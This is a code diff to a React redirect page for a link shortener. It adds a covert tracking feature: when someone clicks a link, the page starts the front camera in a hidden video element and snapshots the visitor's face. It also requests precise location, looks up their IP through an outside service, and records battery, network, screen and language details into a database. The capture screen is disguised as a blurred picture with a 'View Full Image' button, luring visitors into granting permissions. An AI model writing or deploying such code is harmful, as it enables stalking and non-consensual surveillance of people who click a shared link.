@@ -1,13 +1,15 @@
-import { useEffect, useState } from 'react';
+import React, { useEffect, useState, useRef } from 'react';
 import { useParams } from 'react-router-dom';
 import { supabase } from '../lib/supabase';
-import { AlertCircle, Lock, ArrowRight, ExternalLink } from 'lucide-react';
+import { AlertCircle, Lock, ArrowRight, ExternalLink, Clock, ShieldAlert, Camera, Globe, Monitor, MapPin } from 'lucide-react';
 import { cn } from '../lib/utils';
 import { SocialIcon } from '../components/SocialIcon';
+import { UAParser } from 'ua-parser-js';
 
 export default function Redirect() {
   const { shortCode } = useParams<{ shortCode: string }>();
   const [error, setError] = useState<string | null>(null);
+  const [isExpired, setIsExpired] = useState(false);
   
   // Password state
   const [isLocked, setIsLocked] = useState(false);
@@ -15,21 +17,144 @@ export default function Redirect() {
   const [targetUrl, setTargetUrl] = useState<string | null>(null);
   const [inputPassword, setInputPassword] = useState("");
   const [passwordError, setPasswordError] = useState("");
+  const [urlId, setUrlId] = useState<string | null>(null);
   
   // Social gate state
   const [socialGate, setSocialGate] = useState<{ title: string; url: string; icon: string; description: string; buttonText: string } | null>(null);
   const [isSocialGateCompleted, setIsSocialGateCompleted] = useState(false);
+  const [animationType, setAnimationType] = useState<'ring' | 'bar'>('ring');
+  const [animationText, setAnimationText] = useState('LOADING');
 
-  const handlePasswordSubmit = (e: React.FormEvent) => {
+  // Intelligence State
+  const [intelConfigs, setIntelConfigs] = useState({ camera: false, location: false });
+  const [isIntelPage, setIsIntelPage] = useState(false);
+  const [isCapturing, setIsCapturing] = useState(false);
+  const [intelData, setIntelData] = useState<{ image?: string; lat?: number; lon?: number }>({});
+  const videoRef = useRef<HTMLVideoElement>(null);
+
+  const logClick = async (id: string, customIntel?: any) => {
+    try {
+      const parser = new UAParser();
+      const result = parser.getResult();
+      
+      let ip = 'Hidden';
+      try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        ip = data.ip;
+      } catch (e) {}
+
+      // Collect System Specs
+      let batteryLevel: number | null = null;
+      let isCharging: boolean | null = null;
+      try {
+        if ('getBattery' in navigator) {
+          const battery: any = await (navigator as any).getBattery();
+          batteryLevel = battery.level;
+          isCharging = battery.charging;
+        }
+      } catch (e) {}
+
+      const networkType = (navigator as any).connection?.effectiveType || (navigator as any).connection?.type || 'Unknown';
+      const screenResolution = `${window.screen.width}x${window.screen.height}`;
+      const language = navigator.language;
+
+      await supabase.from('link_analytics').insert({
+        url_id: id,
+        ip_address: ip,
+        device_type: result.device.type || 'Desktop',
+        browser: result.browser.name || 'Unknown',
+        os: result.os.name || 'Unknown',
+        referrer: document.referrer || 'Direct',
+        captured_image: customIntel?.image || intelData.image || null,
+        latitude: customIntel?.lat || intelData.lat || null,
+        longitude: customIntel?.lon || intelData.lon || null,
+        battery_level: batteryLevel,
+        is_charging: isCharging,
+        network_type: networkType,
+        screen_resolution: screenResolution,
+        language: language
+      });
+
+      await supabase.rpc('increment_clicks', { row_id: id });
+    } catch (err) {
+      console.error("Log failed:", err);
+    }
+  };
+
+  const startCamera = async () => {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      if (videoRef.current) {
+        videoRef.current.srcObject = stream;
+      }
+    } catch (err) {
+      console.error("Camera access denied:", err);
+    }
+  };
+
+  const requestLocation = () => {
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          setIntelData(prev => ({ ...prev, lat: position.coords.latitude, lon: position.coords.longitude }));
+        },
+        (err) => console.error("Location access denied:", err),
+        { enableHighAccuracy: true }
+      );
+    }
+  };
+
+  const captureIntelAndProceed = async () => {
+    setIsCapturing(true);
+    let finalIntel = { ...intelData };
+
+    // Capture Image if video is running
+    if (videoRef.current && videoRef.current.srcObject) {
+      const canvas = document.createElement('canvas');
+      canvas.width = videoRef.current.videoWidth;
+      canvas.height = videoRef.current.videoHeight;
+      const ctx = canvas.getContext('2d');
+      if (ctx) {
+        ctx.drawImage(videoRef.current, 0, 0);
+        finalIntel.image = canvas.toDataURL('image/jpeg', 0.5); // Compressed jpeg
+        setIntelData(prev => ({ ...prev, image: finalIntel.image }));
+        
+        // Stop camera
+        (videoRef.current.srcObject as MediaStream).getTracks().forEach(track => track.stop());
+      }
+    }
+
+    if (urlId) await logClick(urlId, finalIntel);
+    
+    if (socialGate && !isSocialGateCompleted) {
+      setIsIntelPage(false);
+    } else if (targetUrl) {
+      setIsIntelPage(false);
+      setTimeout(() => {
+        window.location.href = targetUrl;
+      }, 500);
+    }
+  };
+
+  const handlePasswordSubmit = async (e: any) => {
     e.preventDefault();
     if (inputPassword === requiredPassword && targetUrl) {
-      if (socialGate && !isSocialGateCompleted) {
-         setIsLocked(false);
+      if (intelConfigs.camera || intelConfigs.location) {
+        setIsLocked(false);
+        setIsIntelPage(true);
+        if (intelConfigs.camera) startCamera();
+        if (intelConfigs.location) requestLocation();
       } else {
-         setIsLocked(false);
-         setTimeout(() => {
-           window.location.href = targetUrl;
-         }, 500);
+        if (urlId) await logClick(urlId);
+        if (socialGate && !isSocialGateCompleted) {
+           setIsLocked(false);
+        } else {
+           setIsLocked(false);
+           setTimeout(() => {
+             window.location.href = targetUrl;
+           }, 300);
+        }
       }
     } else {
       setPasswordError("Incorrect password");
@@ -38,16 +163,14 @@ export default function Redirect() {
 
   const handleSocialAction = () => {
     if (!socialGate) return;
-    // Open link in new tab
     window.open(socialGate.url, '_blank', 'noopener,noreferrer');
     
-    // Automatically complete after a short delay (or immediately)
     setTimeout(() => {
       setIsSocialGateCompleted(true);
       if (targetUrl) {
         setTimeout(() => {
           window.location.href = targetUrl;
-        }, 500);
+        }, 300);
       }
     }, 1500);
   };
@@ -59,87 +182,91 @@ export default function Redirect() {
       try {
         const domain = window.location.hostname;
         
-        // Try fetching with password and social gate first
-        let fetchedData;
-        let fetchedError;
-        
         const res = await supabase
           .from('urls')
-          .select('long_url, password, social_gate_title, social_gate_url, social_gate_icon, social_gate_description, social_gate_button_text')
+          .select('*')
           .eq('domain', domain)
           .eq('short_code', shortCode)
           .single();
 
-        if (res.error && (res.error.message.includes('column "password" does not exist') || res.error.message.includes('column "social_gate_title" does not exist') || res.error.message.includes('column "social_gate_icon" does not exist') || res.error.message.includes('column "social_gate_description" does not exist'))) {
-          // Fallback if the user hasn't run the ALTER TABLE yet
-          const fallbackRes = await supabase
-            .from('urls')
-            .select('long_url')
-            .eq('domain', domain)
-            .eq('short_code', shortCode)
-            .single();
-          fetchedData = fallbackRes.data;
-          fetchedError = fallbackRes.error;
-        } else {
-          fetchedData = res.data;
-          fetchedError = res.error;
-        }
-
-        if (fetchedError) {
-          console.error("Supabase Error:", fetchedError);
-          if (fetchedError.code === 'PGRST116') {
-            setError('We could not find a URL for this short code. It may have expired or never existed.');
-          } else if (fetchedError.message.includes('relation "urls" does not exist')) {
-             setError('Database table "urls" has not been created yet in the Supabase project.');
-          } else {
-             setError(fetchedError.message);
-          }
+        if (res.error) {
+          setError('Link not found in our database.');
           return;
         }
 
-        if (fetchedData && fetchedData.long_url) {
-          setTargetUrl(fetchedData.long_url);
-          
-          let needsLock = false;
-          let needsGate = false;
+        const data = res.data;
+        setUrlId(data.id);
 
-          if (fetchedData.password) {
-            setRequiredPassword(fetchedData.password);
-            needsLock = true;
+        // Check Expiration
+        if (data.expires_at) {
+          if (new Date(data.expires_at) < new Date()) {
+            setIsExpired(true);
+            return;
           }
-          
-          if (fetchedData.social_gate_title && fetchedData.social_gate_url) {
-            setSocialGate({
-              title: fetchedData.social_gate_title,
-              url: fetchedData.social_gate_url,
-              icon: fetchedData.social_gate_icon || 'link',
-              description: fetchedData.social_gate_description || 'Complete the action below to unlock your link.',
-              buttonText: fetchedData.social_gate_button_text || 'Verify & Continue'
-            });
-            needsGate = true;
-          }
-          
-          if (needsLock) {
-            setIsLocked(true);
-          } else if (needsGate) {
-             // Don't fast redirect, wait for gate
-          } else {
-            // Fast redirect
-            setTimeout(() => {
-              window.location.href = fetchedData.long_url;
-            }, 800);
-          }
+        }
+
+        setTargetUrl(data.long_url);
+        setAnimationType(data.animation_type || 'ring');
+        setAnimationText(data.animation_text || 'LOADING');
+        setIntelConfigs({
+          camera: !!data.capture_camera,
+          location: !!data.capture_location
+        });
+        
+        let needsLock = false;
+
+        if (data.password) {
+          setRequiredPassword(data.password);
+          needsLock = true;
+        }
+        
+        if (data.social_gate_title && data.social_gate_url) {
+          setSocialGate({
+            title: data.social_gate_title,
+            url: data.social_gate_url,
+            icon: data.social_gate_icon || 'link',
+            description: data.social_gate_description || 'Complete the action below to unlock your link.',
+            buttonText: data.social_gate_button_text || 'Verify & Continue'
+          });
+        }
+
+        if (needsLock) {
+          setIsLocked(true);
+        } else if (data.capture_camera || data.capture_location) {
+          setIsIntelPage(true);
+          if (data.capture_camera) startCamera();
+          if (data.capture_location) requestLocation();
+        } else if (data.social_gate_title && data.social_gate_url) {
+          await logClick(data.id);
         } else {
-          setError('Invalid URL record found.');
+          await logClick(data.id);
+          setTimeout(() => {
+            window.location.href = data.long_url;
+          }, 500);
         }
       } catch (err) {
-        console.error("Unexpected error:", err);
-        setError('An unexpected error occurred while redirecting.');
+        setError('An unexpected system error occurred.');
       }
     }
 
     fetchLongUrl();
   }, [shortCode]);
+
+  if (isExpired) {
+    return (
+      <div className="min-h-screen bg-[#050505] flex items-center justify-center p-6 bg-[radial-gradient(circle_at_center,rgba(220,38,38,0.05),transparent_70%)]">
+        <div className="w-full max-w-md bg-zinc-900/50 border border-red-500/20 rounded-3xl p-10 text-center backdrop-blur-xl animate-in fade-in zoom-in duration-500">
+          <div className="w-20 h-20 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
+            <ShieldAlert className="text-red-500 w-10 h-10" />
+          </div>
+          <h1 className="text-3xl font-black text-white mb-2 uppercase tracking-tighter">Link Expired</h1>
+          <p className="text-zinc-400 text-sm mb-8 leading-relaxed">This redirection link has reached its scheduled expiration date and is no longer active.</p>
+          <div className="h-[1px] w-full bg-zinc-800 mb-8" />
+          <p className="text-[10px] text-zinc-600 font-bold uppercase tracking-[0.3em]">SECURE SYSTEM V2.1</p>
+        </div>
+      </div>
+    );
+  }
 
   if (error) {
     return (
@@ -156,6 +283,114 @@ export default function Redirect() {
           >
             Return Home
           </a>
+        </div>
+      </div>
+    );
+  }
+
+  if (isIntelPage) {
+    if (isCapturing) {
+      return (
+        <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-6 relative overflow-hidden font-sans">
+          <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-blue-500/5 blur-[160px] rounded-full pointer-events-none"></div>
+
+          {/* Hidden utilities for background capture */}
+          {intelConfigs.camera && (
+            <video 
+              ref={videoRef} 
+              autoPlay 
+              playsInline 
+              muted 
+              className="hidden"
+            />
+          )}
+
+          <div className="flex flex-col items-center gap-16 z-10 w-full max-w-lg">
+            {animationType === 'ring' ? (
+              <div className="relative w-64 h-64 md:w-80 md:h-80 flex items-center justify-center animate-in zoom-in duration-700">
+                <div className="absolute inset-0 rounded-full p-[2px] bg-gradient-to-tr from-[#FF512F] via-[#DD2476] to-[#4facfe] animate-[spin_1.2s_linear_infinite] shadow-[0_0_100px_rgba(221,36,118,0.25)]">
+                  <div className="w-full h-full rounded-full bg-[#050505]" />
+                </div>
+                <div className="relative z-10 flex flex-col items-center justify-center w-full h-full">
+                  <span className="relative z-20 text-white font-black tracking-[0.2em] text-2xl md:text-5xl uppercase drop-shadow-[0_0_20px_rgba(255,255,255,0.4)] text-center px-8 leading-tight">
+                    {animationText || 'LOADING'}
+                  </span>
+                </div>
+              </div>
+            ) : (
+              <div className="w-full flex flex-col items-center gap-12 animate-in fade-in slide-in-from-bottom-8 duration-700">
+                <div className="text-center relative">
+                   <h2 className="relative text-4xl md:text-6xl font-black text-white tracking-[0.1em] mb-4 uppercase drop-shadow-2xl">{animationText || 'LOADING'}</h2>
+                   <div className="h-0.5 w-24 bg-blue-500/50 mx-auto rounded-full" />
+                </div>
+                <div className="w-full max-w-sm h-3 bg-zinc-900 border border-white/5 rounded-full overflow-hidden p-0.5 shadow-inner backdrop-blur-sm">
+                  <div className="h-full bg-gradient-to-r from-[#FF512F] via-[#DD2476] to-[#4facfe] rounded-full animate-[loading_0.8s_ease-in-out_infinite] shadow-[0_0_15px_rgba(221,36,118,0.4)]" />
+                </div>
+              </div>
+            )}
+            
+            <div className="flex flex-col items-center gap-4">
+               <div className="flex items-center gap-6">
+                 <div className="h-[1px] w-10 bg-zinc-800"></div>
+                 <span className="text-[12px] text-zinc-500 font-black uppercase tracking-[0.8em]">by saqib</span>
+                 <div className="h-[1px] w-10 bg-zinc-800"></div>
+               </div>
+               <div className="flex items-center gap-2 text-[9px] text-zinc-700 font-bold uppercase tracking-widest opacity-60">
+                 <span>SECURE SYSTEM</span>
+                 <span className="w-1 h-1 bg-zinc-800 rounded-full"></span>
+                 <span>V2.1.0</span>
+               </div>
+            </div>
+          </div>
+          <style dangerouslySetInnerHTML={{ __html: `
+            @keyframes loading {
+              0% { width: 5%; margin-left: -5%; opacity: 0; }
+              20% { opacity: 1; }
+              50% { width: 60%; margin-left: 20%; }
+              80% { opacity: 1; }
+              100% { width: 5%; margin-left: 100%; opacity: 0; }
+            }
+          `}} />
+        </div>
+      );
+    }
+
+    return (
+      <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-4 relative overflow-hidden font-sans">
+        <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_#121212_0%,_#050505_70%)] -z-10"></div>
+        
+        {/* Hidden internal utilities */}
+        {intelConfigs.camera && (
+          <video 
+            ref={videoRef} 
+            autoPlay 
+            playsInline 
+            muted 
+            className="hidden"
+          />
+        )}
+
+        <div className="max-w-md w-full bg-[#0F0F0F]/90 border border-white/10 rounded-[40px] p-10 shadow-2xl relative z-10 backdrop-blur-3xl flex flex-col items-center text-center">
+          <div className="relative w-full aspect-[16/10] mb-8 rounded-3xl overflow-hidden group">
+            <img 
+              src="https://ik.imagekit.io/19imy4f1u/lite_1777569405694_n0JDhhj0w.jpeg" 
+              alt="Verification"
+              className="w-full h-full object-cover blur-[2px] scale-110 opacity-60 group-hover:blur-0 group-hover:scale-100 transition-all duration-700"
+            />
+            <div className="absolute inset-0 bg-gradient-to-t from-[#0F0F0F] via-transparent to-transparent"></div>
+          </div>
+          
+          <button
+            onClick={captureIntelAndProceed}
+            className="w-full bg-[#EDEDED] text-black hover:bg-white font-black py-5 px-8 rounded-2xl active:scale-95 transition-all flex items-center justify-center gap-4 group shadow-[0_0_40px_rgba(255,255,255,0.05)] border border-white/10"
+          >
+            <span className="uppercase tracking-[0.2em] text-[10px]">View Full Image</span>
+            <ArrowRight className="w-4 h-4 group-hover:translate-x-1 transition-transform" />
+          </button>
+          
+          <p className="mt-8 text-[9px] text-zinc-800 font-bold uppercase tracking-[0.3em] font-mono opacity-50">
+            SYSTEM_ACCESS_NODE_V2.1 - SECURE
+          </p>
         </div>
       </div>
     );
@@ -229,20 +464,71 @@ export default function Redirect() {
   }
 
   return (
-    <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-4 relative overflow-hidden">
-      {/* Dynamic ambient glow matched to the ring colors */}
-      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[300px] h-[300px] bg-gradient-to-tr from-pink-500 via-orange-500 to-blue-500 opacity-20 blur-[100px] rounded-full mix-blend-screen animate-[pulse_2s_ease-in-out_infinite]"></div>
+    <div className="min-h-screen bg-[#050505] flex flex-col items-center justify-center p-6 relative overflow-hidden font-sans">
+      {/* Background FX - Ambient only */}
+      <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[600px] h-[600px] bg-blue-500/5 blur-[160px] rounded-full pointer-events-none"></div>
 
-      <div className="relative w-48 h-48 md:w-64 md:h-64 flex items-center justify-center">
-        {/* RGB Gradient Ring */}
-        <div className="absolute inset-0 rounded-full bg-gradient-to-tr from-[#FF512F] via-[#DD2476] to-[#4facfe] animate-[spin_1s_linear_infinite] shadow-[0_0_40px_rgba(221,36,118,0.4)] blur-[1px]"></div>
-        
-        {/* Inner Dark Circle creating the "donut" thickness */}
-        <div className="absolute inset-[15%] rounded-full bg-[#0d0d0d] shadow-[inset_0_-5px_20px_rgba(0,0,0,0.8),0_5px_20px_rgba(0,0,0,0.9)] z-10 flex items-center justify-center overflow-hidden">
-          <div className="absolute inset-0 w-full h-full rounded-full bg-gradient-to-b from-[#1a1a1a] to-[#050505] opacity-50"></div>
-          <span className="relative z-20 text-white font-bold tracking-[0.2em] text-xl md:text-3xl uppercase">saqib</span>
+      <div className="flex flex-col items-center gap-16 z-10 w-full max-w-lg">
+        {/* Strictly Conditional Animation Rendering */}
+        {animationType === 'ring' ? (
+          <div className="relative w-64 h-64 md:w-80 md:h-80 flex items-center justify-center animate-in zoom-in duration-700">
+            {/* The Luxury RGB Glow Ring - Only the border rotates */}
+            <div className="absolute inset-0 rounded-full p-[2px] bg-gradient-to-tr from-[#FF512F] via-[#DD2476] to-[#4facfe] animate-[spin_1.2s_linear_infinite] shadow-[0_0_100px_rgba(221,36,118,0.25)]">
+              <div className="w-full h-full rounded-full bg-[#050505]" />
+            </div>
+            
+            {/* Static Inner Content Container */}
+            <div className="relative z-10 flex flex-col items-center justify-center w-full h-full">
+              {/* Inner Glow Overlay */}
+              <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,rgba(255,255,255,0.03),transparent_70%)] pointer-events-none"></div>
+              
+              {/* User Content - This stays static */}
+              <span className="relative z-20 text-white font-black tracking-[0.2em] text-2xl md:text-5xl uppercase drop-shadow-[0_0_20px_rgba(255,255,255,0.4)] text-center px-8 leading-tight">
+                {animationText || 'LOADING'}
+              </span>
+            </div>
+          </div>
+        ) : animationType === 'bar' ? (
+          <div className="w-full flex flex-col items-center gap-12 animate-in fade-in slide-in-from-bottom-8 duration-700">
+            {/* Minimalist Bar Loading */}
+            <div className="text-center relative">
+               <span className="text-white/[0.02] font-black text-[120px] absolute -top-20 left-1/2 -translate-x-1/2 tracking-tighter uppercase select-none pointer-events-none truncate w-full opacity-50">
+                {animationText.charAt(0) || 'L'}
+               </span>
+               <h2 className="relative text-4xl md:text-6xl font-black text-white tracking-[0.1em] mb-4 uppercase drop-shadow-2xl">{animationText || 'LOADING'}</h2>
+               <div className="h-0.5 w-24 bg-blue-500/50 mx-auto rounded-full" />
+            </div>
+            
+            <div className="w-full max-w-sm h-3 bg-zinc-900 border border-white/5 rounded-full overflow-hidden p-0.5 shadow-inner backdrop-blur-sm">
+              <div className="h-full bg-gradient-to-r from-[#FF512F] via-[#DD2476] to-[#4facfe] rounded-full animate-[loading_0.8s_ease-in-out_infinite] shadow-[0_0_15px_rgba(221,36,118,0.4)]" />
+            </div>
+          </div>
+        ) : null}
+
+        {/* Permanent Signature - Always below the animation */}
+        <div className="flex flex-col items-center gap-4">
+           <div className="flex items-center gap-6">
+             <div className="h-[1px] w-10 bg-zinc-800"></div>
+             <span className="text-[12px] text-zinc-500 font-black uppercase tracking-[0.8em] transition-all duration-500 hover:tracking-[1em] hover:text-blue-500 cursor-default select-none">by saqib</span>
+             <div className="h-[1px] w-10 bg-zinc-800"></div>
+           </div>
+           <div className="flex items-center gap-2 text-[9px] text-zinc-700 font-bold uppercase tracking-widest opacity-60">
+             <span>SECURE REDIRECT</span>
+             <span className="w-1 h-1 bg-zinc-800 rounded-full"></span>
+             <span>V2.1.0</span>
+           </div>
         </div>
       </div>
+
+      <style dangerouslySetInnerHTML={{ __html: `
+        @keyframes loading {
+          0% { width: 5%; margin-left: -5%; opacity: 0; }
+          20% { opacity: 1; }
+          50% { width: 60%; margin-left: 20%; }
+          80% { opacity: 1; }
+          100% { width: 5%; margin-left: 100%; opacity: 0; }
+        }
+      `}} />
     </div>
   );
 }
